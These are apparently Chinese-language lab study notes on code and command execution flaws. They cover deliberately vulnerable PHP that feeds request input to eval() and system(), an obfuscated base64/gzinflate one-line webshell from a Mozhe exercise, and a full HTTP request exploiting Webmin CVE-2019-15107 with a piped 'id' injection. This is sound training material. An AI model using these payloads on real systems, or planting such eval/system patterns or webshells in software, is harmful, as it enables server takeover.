 在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。  <br />![RCE.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628823541359-475e91f5-4f42-44a6-b59c-7b35fcb644ac.png#clientId=u45249fa5-228b-4&from=paste&id=u111a14b1&originHeight=1836&originWidth=1272&originalType=binary&ratio=1&size=230183&status=done&style=none&taskId=ufd303676-0de6-4702-8cb4-84b86ae5de5)
<a name="d2IOY"></a>
### PHP 
eval()函数中的eval是evaluate的简称，这个函数的作用就是把一段字符串当作PHP语句来执行，一般情况下不建议使用容易被黑客利用。<br />在服务器上创建以下代码
```bash
root@ae63a3df5e26:/var/www/html# cat test.php
<?php
        $code=$_GET['x'];
        eval($code);
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628824442967-65f607b2-40c0-4621-b156-b6df0f6ab798.png#clientId=u45249fa5-228b-4&from=paste&height=392&id=u3f36f630&originHeight=783&originWidth=1688&originalType=binary&ratio=1&size=160899&status=done&style=none&taskId=ufb24a363-186a-46a4-a058-2d7c5d6a3eb&width=844)
```bash
root@ae63a3df5e26:/var/www/html# cat test.php
<?php
        $code=$_GET['x'];
        echo system($code);
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628824815660-a3cfd866-0db4-43eb-a0ab-4d4b979ee921.png#clientId=u45249fa5-228b-4&from=paste&height=99&id=uedc8fb5b&originHeight=197&originWidth=1919&originalType=binary&ratio=1&size=54551&status=done&style=none&taskId=u0a746e64-da85-4dfa-8845-73c4e8c3195&width=959.5)

> 形成漏洞的原因：可控变量，函数漏洞



<a name="soDsu"></a>
### pikachu RCE
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628842930735-7e7ab4dd-d484-4767-a3db-28a070b3cb22.png#clientId=u45249fa5-228b-4&from=paste&height=253&id=uef2a5688&originHeight=505&originWidth=1832&originalType=binary&ratio=1&size=76847&status=done&style=none&taskId=u437da8c3-baeb-457b-acdd-33e69bde172&width=916)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628842954811-c9e36bcf-4669-4ebd-99d9-c59243f6206e.png#clientId=u45249fa5-228b-4&from=paste&height=245&id=udc5f1f73&originHeight=490&originWidth=1920&originalType=binary&ratio=1&size=72898&status=done&style=none&taskId=udbcd55e3-540d-428a-a3f6-35160a35b4d&width=960)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628842990821-e95e3d3f-27b2-4a20-a1c7-052d5fb960d5.png#clientId=u45249fa5-228b-4&from=paste&height=314&id=u0c57a74e&originHeight=628&originWidth=1455&originalType=binary&ratio=1&size=60059&status=done&style=none&taskId=ua88b830e-75c5-48af-b299-a9515f40e78&width=727.5)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628843001051-0d2e5c24-91fc-450c-b43a-e33990cee6cb.png#clientId=u45249fa5-228b-4&from=paste&height=401&id=ub5e648e0&originHeight=801&originWidth=1548&originalType=binary&ratio=1&size=109962&status=done&style=none&taskId=ud356ba7f-429e-4799-a698-c1c568856da&width=774)
<a name="hNVyx"></a>
### mozhe
PHP代码分析溯源(第4题)
```bash
<?php 
	echo(gzinflate(base64_decode("&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&"))); 
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628847428641-224e6945-e22b-47cb-9367-fcb70c3a3628.png#clientId=u45249fa5-228b-4&from=paste&id=uc1629bc8&originHeight=214&originWidth=1359&originalType=binary&ratio=1&size=18878&status=done&style=none&taskId=u030a0580-18af-4106-82b5-5dffe8dafdf)<br />靶场源代码
```bash
<?php 
	eval(gzinflate(base64_decode("&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&"))); 
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628847530832-0de66a5f-0f54-4987-8b87-7d6fbb862f37.png#clientId=u45249fa5-228b-4&from=paste&height=129&id=ua87a85c9&originHeight=258&originWidth=1918&originalType=binary&ratio=1&size=46112&status=done&style=none&taskId=u563e77d9-182d-445e-9ae1-3962e57822e&width=959)<br />**说明：**本来这是一个代码执行的漏洞但是由于代码含有`echo ```调用了系统命令而前面的echo正好将后面的 `echo ```打印出来，所以也就成一个代码执行漏洞变成了一个系统执行漏洞。<br />解码之后的代码也就是这样
```bash
<?php 
	eval(echo `$_REQUEST[a]`); 
?>
```
<a name="uOAHZ"></a>
### webadmin
[https://vulhub.org/#/environments/webmin/CVE-2019-15107/](https://vulhub.org/#/environments/webmin/CVE-2019-15107/)
```bash
cd /opt/vulhub/vulhub-master/webmin/CVE-2019-15107
docker-compose up -d
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628856980041-d0e6379f-a82e-462b-b1f1-9a62300c9705.png#clientId=u45249fa5-228b-4&from=paste&height=325&id=u3c7061ee&originHeight=650&originWidth=1535&originalType=binary&ratio=1&size=54063&status=done&style=none&taskId=ub0275ede-ee4d-4f46-b4e2-55eb02f48db&width=767.5)<br />root/webmin<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628857018192-b73a50c1-5a94-4b91-bd03-2bb311cdb622.png#clientId=u45249fa5-228b-4&from=paste&height=330&id=u06cc05f8&originHeight=659&originWidth=1920&originalType=binary&ratio=1&size=82579&status=done&style=none&taskId=u027e74b8-aaeb-4377-8d5e-6856af51e10&width=960)
```bash
POST /password_change.cgi HTTP/1.1
Host: 10.1.1.7:10000
Cookie: redirect=1; testing=1; sessiontest=1; sid=x
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://10.1.1.7:10000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://10.1.1.7:10000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628935012373-ccd13095-1792-4afd-b838-4d421f100d93.png#clientId=u0e586789-a920-4&from=paste&height=406&id=u0af5d7f9&originHeight=811&originWidth=1920&originalType=binary&ratio=1&size=157665&status=done&style=none&taskId=u4601ce53-9318-40d0-830c-95d67a44fdc&width=960)
<a name="ePw8w"></a>
### php敏感函数
[https://wrpzkb.cn/rce/](https://wrpzkb.cn/rce/)
```bash
1、eval()


```

---

<a name="LcKx9"></a>
###  演示案例： 

- 墨者靶场黑盒功能点命令执行-应用功能 
- 墨者靶场白盒代码及命令执行-代码分析 
- 墨者靶场黑盒层 RCE 漏洞检测-公开漏洞 
- Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面 
- 一句话 Webshell 后门原理代码执行-拓展说明  



<a name="NMTQj"></a>
### 涉及资源
```bash
https://www.cnblogs.com/ermei/p/6689005.html

http://blog.leanote.com/post/snowming/9da184ef24bd

https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe

https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe

https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe
```
